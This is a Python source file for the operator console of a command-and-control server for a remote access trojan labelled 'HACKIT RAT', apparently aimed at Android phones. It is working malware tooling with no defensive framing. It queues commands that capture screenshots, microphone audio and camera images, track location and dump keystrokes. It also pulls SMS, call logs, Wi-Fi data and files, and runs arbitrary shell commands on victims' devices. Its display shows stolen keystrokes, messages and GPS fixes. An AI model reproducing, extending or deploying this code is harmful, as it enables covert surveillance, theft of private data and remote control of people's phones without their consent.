"""Live operator UI: a full-screen terminal that fills itself from the C2.

Sessions on the left, events and keystrokes on the right, location and task
state underneath, one command line at the bottom. The listener runs on its own
thread, so the screen never blocks a beacon and a slow disk never freezes the
feed. If stdout is not a TTY it degrades to a plain line feed.
"""
from __future__ import annotations

import asyncio
import os
import shutil
import threading
import time
import json
from typing import Dict, List, Optional

from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_RED, B_WHITE, B_YELLOW, DIM, GREEN

from . import protocol, store
from .server import Hub, make_app

KIND_COLOR = {
    "keylog": B_MAGENTA,
    "sms": B_CYAN,
    "call": B_CYAN,
    "notif": B_WHITE,
    "loc": B_GREEN,
    "cam": B_YELLOW,
    "mic": B_YELLOW,
    "clip": B_WHITE,
    "probe": DIM,
    "info": DIM,
    "native": DIM,
    "register": GREEN,
    "shell": B_RED,
}

HELP = [
    ("session", "1-9 select · j/k next/prev · Space refresh · Enter open detail"),
    ("capture", "s screenshot · m mic 15s · c camera · v live screen stream"),
    ("intel", "i info · l locate · g keylog · a apps · u usage · w wifi"),
    ("files", "f <dir> list · p <path> pull"),
    ("control", "x <cmd> shell · t <ms> toast · b buzz"),
    ("misc", "r refresh · h help · q quit (Ctrl-C also)"),
]


class LiveUI:
    def __init__(self, host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) -> None:
        self.hub = Hub(psk=psk, token="operator", public_url=public_url, udp_port=udp_port)
        self.host = host
        self.port = port
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._serve, name="c2", daemon=True)
        self.sessions: List[dict] = []
        self.index = 0
        self.feed: List[tuple] = []
        self.keys: List[str] = []
        self.tasks: Dict[int, str] = {}
        self.seen_events: Dict[str, int] = {}
        self.message = ""
        self.started = time.time()
        self.width = 100
        self.height = 30
        self.helping = False
        self.last_frame: Optional[str] = None
        self.flash: Optional[str] = None

    # ------------------------------------------------------------- server
    def _serve(self) -> None:
        from aiohttp import web

        asyncio.set_event_loop(self.loop)
        app = make_app(self.hub)

        async def boot() -> None:
            runner = web.AppRunner(app, access_log=None)
            await runner.setup()
            site = web.TCPSite(runner, self.host, self.port)
            await site.start()

        self.loop.create_task(boot())
        self.loop.run_forever()

    def start(self) -> None:
        self.thread.start()
        time.sleep(0.3)
        self.refresh()

    # -------------------------------------------------------------- state
    def current(self) -> Optional[dict]:
        if not self.sessions:
            return None
        self.index = max(0, min(self.index, len(self.sessions) - 1))
        return self.sessions[self.index]

    def refresh(self) -> None:
        store.mark_offline(self.hub.offline_after)
        self.sessions = store.sessions()
        self.sessions.sort(key=lambda r: (not r["online"], -r["last_seen"]))
        session = self.current()
        if not session:
            return
        sid = session["sid"]
        last = self.seen_events.get(sid, 0)
        for event in store.events(sid, after_id=last, limit=40):
            self.seen_events[sid] = event["id"]
            stamp = time.strftime("%H:%M:%S", time.localtime(event["ts"]))
            self.feed.append((stamp, event["kind"], _compact(event["body"], 220)))
        del self.feed[:-60]
        for task in store.tasks(sid, 12):
            state = task["state"]
            if self.tasks.get(task["id"]) != state and state != "queued":
                self.tasks[task["id"]] = state
                if task.get("output"):
                    self.feed.append((time.strftime("%H:%M:%S"), "out:" + task["cmd"],
                                      _compact(task["output"], 200)))
        for row in store.keylogs(sid, 0, 200)[-40:]:
            line = f"[{row['package']}] {row['text']}"
            if line not in self.keys:
                self.keys.append(line)
        del self.keys[:-40]

    def queue(self, cmd: str, args: Optional[List[str]] = None) -> None:
        session = self.current()
        if not session:
            self.message = "no session"
            return
        if not protocol.allowed(cmd, _spec_modules(session)):
            self.message = f"{cmd} not in spec '{session.get('spec', 'rat')}'"
            return
        try:
            task_id = store.queue_task(session["sid"], cmd, args or [])
        except protocol.ProtocolError as exc:
            self.message = str(exc)
            return
        self.hub.wake(session["sid"])
        self.message = f"queued #{task_id} {cmd}"

    # ------------------------------------------------------------- render
    def _box(self, title: str, rows: List[str], width: int, color: str, rows_needed: int) -> List[str]:
        head = f" {title} "
        top = _colored("┌" + head.ljust(width - 2, "─") + "┐", color)
        out = [top]
        for i in range(rows_needed):
            body = rows[i] if i < len(rows) else ""
            out.append(_colored("│ ", color) + _pad(body, width - 4) + _colored(" │", color))
        out.append(_colored("└" + "─" * (width - 2) + "┘", color))
        return out

    def render(self) -> str:
        size = shutil.get_terminal_size((110, 32))
        self.width = max(80, min(size.columns, 200))
        self.height = max(24, min(size.lines, 50))
        width = self.height and self.width
        session = self.current()

        uptime = int(time.time() - self.started)
        online = sum(1 for s in self.sessions if s["online"])
        head_l = _colored(" ● HACKIT RAT ", B_RED) + _colored(self.hub.public_url, B_CYAN)
        head_r = (f"up {uptime//60}m{uptime%60:02d}s   "
                  f"{_colored(str(online), GREEN if online else DIM)}/{len(self.sessions)} online   "
                  f"{len(self.feed)} events")
        header = _pad(head_l, self.width - _visible_len(head_r) - 2) + _colored(head_r, DIM)
        lines = [header, _colored("═" * self.width, DIM)]
        _ = width

        if self.helping:
            help_rows: List[str] = []
            for group, text in HELP:
                help_rows.append(_colored(group.ljust(9), B_CYAN) + " " + text)
            lines += self._box("HELP — any verb also works as a raw command (e.g. sms_dump 50)",
                                help_rows, self.width, B_CYAN, len(help_rows) + 1)
            lines.append(_colored("  press any key to return", DIM))
            return "\n".join(lines)

        left_w = min(34, self.width // 3)
        right_w = self.width - left_w - 4
        session = self.current()

        # left: devices
        srows: List[str] = []
        if not self.sessions:
            srows.append(_colored("waiting for the first beacon…", DIM))
            srows.append(_colored("build: make app", DIM))
            srows.append(_colored("deliver: inject / make stager", DIM))
        for i, row in enumerate(self.sessions[:10]):
            mark = _colored("▸", B_GREEN) if i == self.index else _colored(" ", DIM)
            dot = _colored("●", GREEN) if row["online"] else _colored("○", DIM)
            spec = (row.get("spec") or "rat")[:7]
            srows.append(f"{mark}{dot} {_colored(spec, B_MAGENTA)} {row['label'][:16]}")
            batt = int(row.get("battery") or 0)
            model = (row.get("model") or "?")[:20]
            bar = "█" * max(1, batt // 14) if batt else "▏"
            srows.append(f"   {_colored(model, DIM)} {bar} {batt}%{'+⚡' if row.get('charging') else ''}")
        lines += self._box("DEVICES", srows, left_w, B_CYAN, self.height - 9)

        # middle: live feed
        feed_rows: List[str] = []
        if not self.feed:
            feed_rows.append(_colored("waiting for events…", DIM))
        for stamp, kind, body in self.feed[-(self.height - 13):]:
            color = KIND_COLOR.get(kind, DIM)
            feed_rows.append(f"{_colored(stamp, DIM)} {_colored(kind[:6].ljust(6), color)} {_clip(_summarize(kind, body), right_w - 16)}")
        lines += self._box("LIVE FEED", feed_rows, right_w, B_WHITE, self.height - 13)

        lines.append(_colored("─" * self.width, DIM))

        # bottom: keystrokes + status
        if session:
            keys_title = f"KEYSTROKES · {session['label'][:12]}"
        else:
            keys_title = "KEYSTROKES"
        key_rows: List[str] = []
        if not self.keys:
            key_rows.append(_colored("no keystrokes captured yet", DIM))
        for line in self.keys[-6:]:
            key_rows.append(_clip(line, self.width // 2 - 4))
        lines += self._box(keys_title, key_rows, self.width // 2, B_MAGENTA, 8)

        stat_rows: List[str] = []
        if session:
            loc = store.locations(session["sid"], 1)
            tasks = store.tasks(session["sid"], 5)
            stat_rows.append(f"{_colored('sid', DIM)} {session['sid'][:18]}  "
                             f"{_colored('ip', DIM)} {session.get('pub_ip') or '-'}  "
                             f"{_colored('sdk', DIM)} {session.get('sdk')}")
            if loc:
                stat_rows.append(f"{_colored('fix', DIM)} {loc[0]['lat']:.4f}, {loc[0]['lon']:.4f} "
                                 f"±{int(loc[0]['accuracy'] or 0)}m {loc[0]['provider']}")
            else:
                stat_rows.append(f"{_colored('fix', DIM)} —")
            if tasks:
                stat_rows.append(" ".join(f"{_colored(t['cmd'], B_WHITE)}:{t['state'][:4]}" for t in tasks))
            if self.last_frame:
                stat_rows.append(f"{_colored('screen', DIM)} {_clip(self.last_frame, self.width // 2 - 20)}")
        else:
            stat_rows.append(_colored("select a device with 1-9 to see status", DIM))
        lines += self._box("STATUS", stat_rows, self.width - self.width // 2 - 2, B_CYAN, 8)

        # footer
        if self.flash:
            lines.append(_colored(" ► " + self.flash, B_YELLOW))
            self.flash = None
        elif self.message:
            lines.append(_colored(" ► " + self.message, B_YELLOW))
            self.message = ""
        else:
            lines.append(_colored(" ► ", DIM) + _colored("h help · q quit", DIM))
        return "\n".join(lines)

    # -------------------------------------------------------------- input
    def handle(self, line: str) -> bool:
        parts = line.split()
        if not parts:
            self.refresh()
            return True
        verb = parts[0].lower()
        args = parts[1:]
        if verb in ("q", "quit", "exit"):
            return False
        if verb in ("help", "?", "h"):
            self.helping = True
            return True
        if verb in ("j", "k") or verb.isdigit():
            if verb == "j":
                self.index = min(self.index + 1, len(self.sessions) - 1)
            elif verb == "k":
                self.index = max(self.index - 1, 0)
            else:
                self.index = max(0, min(int(verb) - 1, len(self.sessions) - 1))
            self.refresh()
            return True
        if verb == "h" or verb == "help" or verb == "?":
            self.helping = not self.helping
            return True
        if verb == "s":
            self.queue("screenshot")
        elif verb == "m":
            self.queue("mic_rec", ["15"])
        elif verb == "c":
            self.queue("cam_shot")
        elif verb == "i":
            self.queue("info")
        elif verb == "l":
            self.queue("loc")
        elif verb == "g":
            self.queue("keylog_dump")
        elif verb == "a":
            self.queue("apps")
        elif verb == "f":
            self.queue("files_ls", [" ".join(args) or "."])
        elif verb == "p":
            self.queue("files_pull", [" ".join(args)])
        elif verb == "x":
            self.queue("shell", [" ".join(args)])
        elif verb == "u":
            self.queue("usage", ["7"])
        elif verb == "w":
            self.queue("wifi_dump")
        elif verb == "t":
            self.queue("toast", [" ".join(args) or "System update"])
        elif verb == "b":
            self.queue("vibrate", ["600"])
        elif verb == "v":
            self.queue("screen_start")
            session = self.current()
            if session:
                self.last_frame = f"{self.hub.public_url}/v1/live/{session['sid']}"
        elif verb == "r":
            self.refresh()
        else:
            self.queue(verb, args)
        return True

    def run(self) -> None:
        interactive = os.isatty(0) and os.isatty(1)
        if not interactive:
            while True:
                try:
                    line = input("rat> ")
                except EOFError:
                    return
                self.refresh()
                print(self.render())
                if not self.handle(line):
                    return
        import select
        import sys
        import termios
        import tty

        fd = sys.stdin.fileno()
        saved = termios.tcgetattr(fd)
        buffer = ""
        try:
            tty.setraw(fd)
            while True:
                os.write(1, b"\x1b[2J\x1b[H")
                os.write(1, self.render().encode("utf-8", "replace"))
                self.refresh()
                ready, _, _ = select.select([fd], [], [], 1.0)
                if not ready:
                    continue
                data = os.read(fd, 32).decode("utf-8", "replace")
                for char in data:
                    if char in ("\x03", "\x04"):
                        raise KeyboardInterrupt
                    if char in ("\r", "\n"):
                        line = buffer.strip()
                        buffer = ""
                        if line and not self.handle(line):
                            return
                        continue
                    if char == "q" and not buffer:
                        raise KeyboardInterrupt
                    if char in ("\x7f", "\b"):
                        buffer = buffer[:-1]
                        continue
                    if char == "\x1b":
                        continue
                    buffer = (buffer + char)[:120]
                os.write(1, f"\x1b[{self.height + 4};1H\x1b[2K rat> {buffer}".encode())
        except KeyboardInterrupt:
            pass
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, saved)


def _clip(text: str, width: int) -> str:
    text = str(text).replace("\n", " ")
    return text if len(text) <= width else text[: max(0, width - 1)] + "…"


def _pad(text: str, width: int) -> str:
    return text + " " * max(0, width - _visible_len(text))


def _visible_len(text: str) -> int:
    total = 0
    index = 0
    while index < len(text):
        if text[index] == "\x1b":
            index += 2
            while index < len(text) and not text[index].isalpha():
                index += 1
            index += 1
            continue
        total += 1
        index += 1
    return total


def _summarize(kind: str, body: str) -> str:
    """One readable line per event kind, no raw JSON walls."""
    try:
        data = json.loads(body)
    except Exception:
        return _compact(body, 300)
    if kind == "sms" and isinstance(data, list):
        out = []
        for row in data[:2]:
            out.append(f"{row.get('from','?')}: {row.get('body','')}")
        return " | ".join(out)
    if kind == "call" and isinstance(data, list):
        out = []
        for row in data[:2]:
            out.append(f"{row.get('number','?')} ({row.get('name','') or 'unknown'}) {row.get('duration',0)}s")
        return " | ".join(out)
    if kind == "loc" and isinstance(data, list) and data:
        row = data[0]
        return f"{row.get('lat')},{row.get('lon')} ±{row.get('acc','?')} {row.get('src','')}"
    if kind == "keylog" and isinstance(data, list):
        return " ".join(str(r.get("text","")) for r in data[:3] if isinstance(r, dict))
    if kind == "notif" and isinstance(data, dict):
        return f"{data.get('pkg','')}: {data.get('title','')} {data.get('text','')}".strip()
    if kind == "clip":
        text = data.get("text") if isinstance(data, dict) else data
        return str(text)[:200]
    if isinstance(data, dict):
        for key in ("name", "path", "pkg", "cmd"):
            if key in data:
                return str(data[key])
    return _compact(body, 300)


def _spec_modules(session: dict) -> Optional[List[str]]:
    spec = session.get("spec") or "rat"
    from . import builder
    return sorted(set(builder.CORE_MODULES + builder.SPECS.get(spec, [])))


def _compact(body: str, limit: int) -> str:
    text = body if len(body) <= limit else body[:limit] + "…"
    return text.replace("\n", " ")


def run(host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) -> None:
    store.init()
    live = LiveUI(host, port, psk, public_url, udp_port)
    live.start()
    try:
        live.run()
    finally:
        print(_colored("\n  listener stopped", DIM))